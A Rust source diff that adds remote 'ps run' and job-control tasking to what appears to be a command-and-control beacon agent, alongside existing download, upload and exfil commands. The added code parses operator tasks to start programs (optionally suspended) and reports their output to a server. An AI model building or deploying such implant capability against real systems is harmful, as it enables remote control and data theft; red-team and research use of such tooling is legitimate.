@@ -126,6 +126,19 @@ pub const COMMAND_GETUID: u32 = 22;
 pub const COMMAND_DISKS: u32 = 15;
 pub const COMMAND_PS_LIST: u32 = 41;
 pub const COMMAND_PS_KILL: u32 = 42;
+/// `ps run` (native beacon_agent Commander.cpp CmdPsRun): start a program,
+/// optionally capture its stdout through a job.
+pub const COMMAND_PS_RUN: u32 = 43;
+/// Job lifecycle/output records (native JobsController: taskId of the
+/// original task, then the job type and state, then the drained output).
+pub const COMMAND_JOB: u32 = 0x8437;
+pub const COMMAND_JOB_LIST: u32 = 46;
+pub const COMMAND_JOBS_KILL: u32 = 47;
+/// Native JOB_TYPE_* / JOB_STATE_* (JobsController.h).
+pub const JOB_TYPE_PROCESS: u8 = 0x3;
+pub const JOB_STATE_RUNNING: u8 = 0x1;
+pub const JOB_STATE_FINISHED: u8 = 0x2;
+pub const JOB_STATE_KILLED: u8 = 0x3;
 pub const COMMAND_DOWNLOAD: u32 = 32;
 pub const COMMAND_UPLOAD: u32 = 33;
 pub const COMMAND_EXFIL: u32 = 35;
@@ -211,6 +224,18 @@ pub enum Task {
     PsList,
     /// `COMMAND_PS_KILL` with the target pid.
     PsKill { pid: u32 },
+    /// `COMMAND_PS_RUN` with the capture flag, the creation state
+    /// (0 normal, 4 suspended) and the full command line.
+    PsRun {
+        output: bool,
+        prog_state: u32,
+        args_len: u16,
+        args: [u8; PATH_CAP],
+    },
+    /// `COMMAND_JOB_LIST`: enumerate the live jobs.
+    JobsList,
+    /// `COMMAND_JOBS_KILL` with the job id (the original task id).
+    JobsKill { job_id: u32 },
     /// `COMMAND_DOWNLOAD` with the file to stream.
     Download { path_len: u16, path: [u8; PATH_CAP] },
     /// `COMMAND_UPLOAD` with the memory id and the destination path.
@@ -365,6 +390,26 @@ pub fn parse_task(r: &mut Reader) -> Option<(Task, u32)> {
             let action = r.u32_le()? as u8;
             let file_id = r.u32_le()?;
             Task::Exfil { action, file_id }
+        }
+        COMMAND_PS_RUN => {
+            // Native CmdPsUnpack order: byte progOutput, byte useToken,
+            // int progState, array progArgs. The token flag is parsed and
+            // ignored (no stored-token infrastructure yet - MVP).
+            let output = r.u8()? != 0;
+            let _use_token = r.u8()?;
+            let prog_state = r.u32_le()?;
+            let (args_len, args) = pack_string(r)?;
+            Task::PsRun {
+                output,
+                prog_state,
+                args_len,
+                args,
+            }
+        }
+        COMMAND_JOB_LIST => Task::JobsList,
+        COMMAND_JOBS_KILL => {
+            let job_id = r.u32_le()?;
+            Task::JobsKill { job_id }
         }
         _ => return None,
     };
@@ -602,6 +647,49 @@ pub fn push_ps_entry(w: &mut Writer, e: &PsEntry) -> bool {
 /// PS_KILL result: `int pid` — the server renders `Process %d killed`.
 pub fn push_ps_kill_result(w: &mut Writer, task_id: u32, pid: u32) -> bool {
     push_result_header(w, task_id, COMMAND_PS_KILL) && w.u32(pid)
+}
+
+/// PS_RUN result (native CmdPsRun): `int pid || byte isOutput || array
+/// prog` — the server renders "Program %v started with PID %d".
+pub fn push_ps_run_result(
+    w: &mut Writer,
+    task_id: u32,
+    pid: u32,
+    output: bool,
+    prog: &[u8],
+) -> bool {
+    push_result_header(w, task_id, COMMAND_PS_RUN)
+        && w.u32(pid)
+        && w.u8(u8::from(output))
+        && w.array(prog)
+}
+
+/// JOB record with drained output (native JobsController):
+/// `byte type || byte RUNNING || array data`.
+pub fn push_job_output(w: &mut Writer, job_id: u32, job_type: u8, state: u8, data: &[u8]) -> bool {
+    push_result_header(w, job_id, COMMAND_JOB) && w.u8(job_type) && w.u8(state) && w.array(data)
+}
+
+/// JOB lifecycle record without payload (finished / killed):
+/// `byte type || byte state`.
+pub fn push_job_end(w: &mut Writer, job_id: u32, job_type: u8, state: u8) -> bool {
+    push_result_header(w, job_id, COMMAND_JOB) && w.u8(job_type) && w.u8(state)
+}
+
+/// JOB_LIST result: `int count`, then `int jobId || word type || word pid`
+/// per entry.
+pub fn push_jobs_list_header(w: &mut Writer, task_id: u32, count: u32) -> bool {
+    push_result_header(w, task_id, COMMAND_JOB_LIST) && w.u32(count)
+}
+
+pub fn push_jobs_list_entry(w: &mut Writer, job_id: u32, job_type: u8, pid: u32) -> bool {
+    w.u32(job_id) && w.u16(job_type as u16) && w.u16(pid as u16)
+}
+
+/// JOBS_KILL result: `byte found || int jobId` — the server renders
+/// "Job %v mark as Killed" / "Job %v not found".
+pub fn push_jobs_kill_result(w: &mut Writer, task_id: u32, found: bool, job_id: u32) -> bool {
+    push_result_header(w, task_id, COMMAND_JOBS_KILL) && w.u8(u8::from(found)) && w.u32(job_id)
 }
 
 /// Result record header: `u32 BE taskId || u32 BE commandId`.
